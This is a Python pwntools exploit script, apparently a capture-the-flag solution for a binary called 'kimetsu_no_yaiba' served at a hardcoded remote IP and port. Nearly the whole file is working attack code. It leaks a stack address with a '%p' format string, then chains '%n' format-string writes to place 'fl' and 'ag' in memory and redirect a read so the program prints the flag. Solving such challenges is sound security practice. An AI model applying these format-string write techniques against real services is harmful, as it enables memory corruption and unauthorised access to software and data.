from pwn import *

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True

LOCAL_BIN = './kimetsu_no_yaiba'

if LOCAL:
    P = process(LOCAL_BIN)

elif REMOTETTCP:
    P = remote('125.235.240.166', 33333)

##########################


##### FUNCTION ######
##########################

def name(name):
    P.sendafter(b': ', name)


def attack(page_index):
    P.sendlineafter(b'> ', b'1')


def skill(strength):
    P.sendlineafter(b'> ', b'2')
    P.sendline(str(strength).encode())


def leak_stack():
    name(b'..%p')
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    P.recvuntil(b'..')
    leak_stack = int(P.recvline().strip(), 16)
    return leak_stack


def get_turn():
    P.sendlineafter(b'n)', b'y')
    name(b'%11$naaa' + p64(turn_stack))
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)


def vuln(payload):
    P.sendlineafter(b'n)', b'y')
    name(payload)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)


##############################
##### FINAL EXPLOITATION #####
##############################

leak_stack = leak_stack()
turn_stack = leak_stack + 0x26b0  # 0x80
get_turn()
# write 0x6020a8 to stack
vuln(b'%6299816c%20$n')
get_turn()

# write 'fl' to 0x6020a8
vuln(b'%27750c%52$n')
get_turn()

# write 0x6020b0 to stack
vuln(b'%6299818c%20$n')
get_turn()

# write 'ag' to 0x6020b0
vuln(b'%26465c%52$n')
get_turn()

# rewrite read_boss offset to read the right string
read_boss_stack = leak_stack + 0x26b0 - 0x4  # 0x80
vuln(b'a%11$naa' + p64(read_boss_stack))

P.interactive()
